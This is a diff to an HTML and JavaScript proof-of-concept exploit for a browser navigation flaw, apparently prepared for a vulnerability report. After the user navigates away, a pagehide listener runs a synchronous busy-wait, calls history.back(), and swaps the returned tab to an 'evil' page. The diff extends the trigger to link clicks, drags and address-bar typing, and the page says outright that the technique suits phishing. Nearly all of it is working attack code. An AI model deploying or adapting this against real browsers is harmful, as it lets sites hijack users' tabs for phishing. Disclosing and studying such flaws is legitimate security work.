@@ -37,6 +37,8 @@ input[type=url]{flex:1;min-width:0;padding:12px 14px;border-radius:12px;border:1
 code{background:rgba(0,0,0,.08);padding:.1em .33em;border-radius:6px}
 .evil code{background:rgba(255,255,255,.12)}
 a{color:inherit}
+.linkRow{margin-top:10px}
+.linkRow a{color:inherit;text-decoration:underline;word-break:break-all}
 </style>
 </head>
 <body class="safe">
@@ -49,14 +51,14 @@ a{color:inherit}
    - Navigates away, then (post-unload) runs a tick that busy-sleeps and calls history.back()
    - On return (Back), shows the stored marker and clears it
    - Safe page (pink) vs Evil page (dark red) visuals
+   - Also demonstrates that this can be triggered via listener-based navigations (clicking/dragging the URL or typing into the address bar)
 */
 
 (()=>{"use strict";
 
-  const WEBHOOK = "http://localhost:8080/test";  // change for your log page (node server I used is included)
-  const STORE   = "__tab_nav_info__";            // localStorage key
+  const WEBHOOK = "http://localhost:8080/test";
+  const STORE   = "__tab_nav_info__";
 
-  // Fetch based log.
   function L(label, body=null){
     try{ fetch(WEBHOOK,{method:"POST",keepalive:true,body: body || label}); }catch(_){}
   }
@@ -64,7 +66,6 @@ a{color:inherit}
   const esc = s => String(s).replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[m]));
   const iso = t => { try{ const d=new Date(t); return isFinite(+d)?d.toISOString():String(t);}catch{return String(t)} };
 
-  // Busy-wait sleep: synchronous to block the page from death.
   function sleep(ms){ const end=Date.now()+ms; while(Date.now()<end){} }
 
   function renderSafe(){
@@ -72,65 +73,58 @@ a{color:inherit}
     const el = document.getElementById("app");
     el.innerHTML =
       '<div class="h"><h2>SAFE - Cross-origin Nav Demo</h2><span class="badge">safe.</span></div>'
-    + '<p style="margin:0 0 12px">Enter a destination URL. Clicking <b>NAVIGATE</b> stores a tab-local marker in <code>localStorage</code> and goes there. Then, the PoC tries to <code>history.back()</code> after a synchronous busy-wait.</p>'
+    + '<p style="margin:0 0 12px">Enter a destination URL. The link below updates as you type. This PoC shows it is not specific to programmatic navigation: you can click the URL, drag the URL to the tab to change it, or just type a URL into the tab search bar to execute the PoC. A listener will run a synchronous busy-wait and then try <code>history.back()</code>.</p>'
     + '<div class="row">'
       + '<input id="u" type="url" inputmode="url" spellcheck="false" autocomplete="off" placeholder="https://example.com" value="https://example.com">'
-      + '<button id="go" class="btn">NAVIGATE -></button>'
     + '</div>'
-    + '<div class="meta">State: a JSON marker is written to <code>localStorage["'+STORE+'"]</code> before navigation. If BFCached, it changes the page BEFORE return, since DOM is still alive. If not BFCached, it changes the page to be evil on load. Clears the marker either way.</div>'
+    + '<div class="linkRow"><a id="nav" href="https://example.com">https://example.com</a></div>'
+    + '<div class="meta">State: a JSON marker is written to <code>localStorage["'+STORE+'"]</code> before navigation (including listener-driven navigations). If BFCached, it changes the page BEFORE return, since DOM is still alive. If not BFCached, it changes the page to be evil on load. Clears the marker either way.</div>';
 
-    document.getElementById("go").onclick = () => {
-      const url = (document.getElementById("u").value||"").trim() || "https://example.com";
-      startExploit(url);
-    };
+    const input = document.getElementById("u");
+    const link  = document.getElementById("nav");
+
+    function setMarker(destUrl){
+      const marker = { url: destUrl, from: location.href, ts: Date.now(), BFCached: true };
+      try{ localStorage.setItem(STORE, JSON.stringify(marker)); }catch(_){}
+      L("[PoC] marker-set: "+JSON.stringify(marker));
+    }
+
+    function update(val){
+      const url = (val||"").trim() || "https://example.com";
+      link.href = url;
+      link.textContent = url;
+      setMarker(url);
+    }
+
+    input.addEventListener("input", ()=>update(input.value));
+    link.addEventListener("click", ()=>setMarker(link.href));
+    update(input.value);
   }
 
   function renderEvil(info){
     document.body.className="evil";
     const el = document.getElementById("app");
+    const i = info||{};
     el.innerHTML =
       '<div class="h"><h2>EVIIL - Returned to This Tab</h2><span class="badge">evil..</span></div>'
     + '<p style="margin:0 0 8px">This tab is now evil. Mainly to implicate how easily this can be used for something like phishing.</p>'
     + '<div class="kv">'
-      + '<div>Destination URL</div><div><code>'+esc(info.url||"")+'</code></div>'
-      + '<div>From URL</div><div><code>'+esc(info.from||"")+'</code></div>'
-      + '<div>Set At</div><div>'+iso(info.ts)+'</div>'      
-      + '<div>BFCached</div><div><code>'+esc(info.BFCached)+'</code></div>'
+      + '<div>Destination URL</div><div><code>'+esc(i.url||"")+'</code> (Defaults to <code>https://example.com</code>)</div>'
+      + '<div>From URL</div><div><code>'+esc(i.from||"")+'</code></div>'
+      + '<div>Set At</div><div>'+iso(i.ts)+'</div>'      
+      + '<div>BFCached</div><div><code>'+esc(i.BFCached)+'</code></div>'
     + '</div>'
     + '<div class="footer">Note, the destination is known only because you used the input to go there, it\'s included to make the page look less bland. Try another destination!</div>';
   }
 
-
-  function startExploit(destUrl){
-    const marker = {
-      url: destUrl,
-      from: location.href,
-      ts: Date.now(),
-      BFCached: true
-    };
-    try{ localStorage.setItem(STORE, JSON.stringify(marker)); }catch(_){}
-    L("[PoC] marker-set: "+JSON.stringify(marker));
-
-
-
-    setTimeout(() => {
-        window.evil = window.location.href = ("https://example.com/");
-    }, 1)
-    setTimeout(async () => { tick() },1) 
-
-
-
-  }
-
-  // Tick runs after nav is initiated; it busy-sleeps and then tries to force a Back
   function tick(){
     try{
-      L("[PoC] tick:start");        
-      // BFCache version.
-      renderEvil(JSON.parse(localStorage.getItem(STORE)));
-      // Long synchronous stall to extend the window's life
+      L("[PoC] tick:start");
+      let stored=null;
+      try{ stored = JSON.parse(localStorage.getItem(STORE)||"null"); }catch(_){}
+      if(!stored){ stored = {url:"",from:location.href,ts:Date.now(),BFCached:true}; }
+      renderEvil(stored);
       sleep(2300);
-      // Attempt to yank the tab back to prior entry
       history.back();
       L("[PoC] tick:history.back() called");
     }catch(e){
@@ -139,10 +133,10 @@ a{color:inherit}
     try{ localStorage.removeItem(STORE); }catch(_){}
   }
 
-
   (function boot(){
     try{ window.focus(); }catch(_){}
-    // Decide which view to render based on marker presence (if BFCache killed us)
+    window.addEventListener("pagehide", (event)=>{ L("[PoC] pagehide"); tick(); }, false);
+
     let raw=null, info=null;
     try{ raw = localStorage.getItem(STORE); }catch(_){}
     if(raw){
